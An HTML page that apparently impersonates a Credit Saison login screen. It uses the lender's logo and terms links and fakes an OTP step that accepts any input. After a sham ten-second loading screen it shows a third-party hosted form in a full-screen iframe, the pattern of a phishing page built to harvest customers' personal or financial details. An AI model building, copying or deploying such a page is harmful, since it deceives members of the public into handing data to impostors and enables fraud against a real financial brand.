
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #87CEEB;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .login-container {
            text-align: center;
            width: 100%;
            max-width: 400px;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .logo img {
            max-width: 150px;
            margin-bottom: 20px;
        }
        #send-otp {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            max-width: 200px;
            margin-top: 20px;
            transition: background-color 0.3s;
        }
        #send-otp:hover {
            background-color: #45a049;
        }
        .loading-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            z-index: 999;
            flex-direction: column;
        }
        .loader {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #form-screen {
            display: none;
        }
        iframe {
            width: 100%;
            height: 100vh;
            border: none;
        }
    </style>
</head>
<body>
    <div class="login-container" id="login-screen">
        <div class="logo">
            <img src="https://i.imgur.com/tQEEhdd.png" alt="Credit Saison Logo">
        </div>
        <div>
            <input type="text" id="mobile" placeholder="Enter Mobile Number" maxlength="10" />
            <div id="otp" style="display: none;">
                <input type="text" id="otp-input" placeholder="Enter OTP" />
            </div>
            <div>
                <input type="checkbox" id="terms">
                <label for="terms">I agree to the <a href="https://regulatory.creditsaison.in/privo-terms-conditions" target="_blank">Terms & Conditions</a> and <a href="https://regulatory.creditsaison.in/privacy-policy" target="_blank">Privacy Policy</a></label>
            </div>
            <button id="send-otp">Send OTP</button>
        </div>
    </div>
    <div class="loading-screen" id="loading-screen">
        <div class="loader"></div>
        <div style="margin-top:10px; color: white; font-size: 18px;">Loading, please wait...</div>
    </div>
    <div id="form-screen">
        <iframe src="https://eu.makeforms.co/pcsy7zl" allowfullscreen></iframe>
    </div>
    <script>
        const sendOtpBtn = document.getElementById('send-otp');
        const mobileInput = document.getElementById('mobile');
        const otpInput = document.getElementById('otp');
        const otpField = document.getElementById('otp-input');
        const loginScreen = document.getElementById('login-screen');
        const loadingScreen = document.getElementById('loading-screen');
        const formScreen = document.getElementById('form-screen');
        const termsCheckbox = document.getElementById('terms');
        sendOtpBtn.addEventListener('click', function() {
            if (!termsCheckbox.checked) {
                alert('Please agree to the Terms & Conditions and Privacy Policy.');
                return;
            }
            if (otpInput.style.display === 'none') {
                if (/^\d{10}$/.test(mobileInput.value)) {
                    otpInput.style.display = 'block';
                    sendOtpBtn.textContent = 'Verify OTP';
                } else {
                    alert('Please enter a valid 10-digit mobile number.');
                }
            } else {
                if (otpField.value.length >= 1) {
                    loginScreen.style.display = 'none';
                    loadingScreen.style.display = 'flex';
                    setTimeout(() => {
                        loadingScreen.style.display = 'none';
                        formScreen.style.display = 'block';
                    }, 10000);
                } else {
                    alert('Please enter a valid OTP.');
                }
            }
        });
    </script>
</body>
</html>
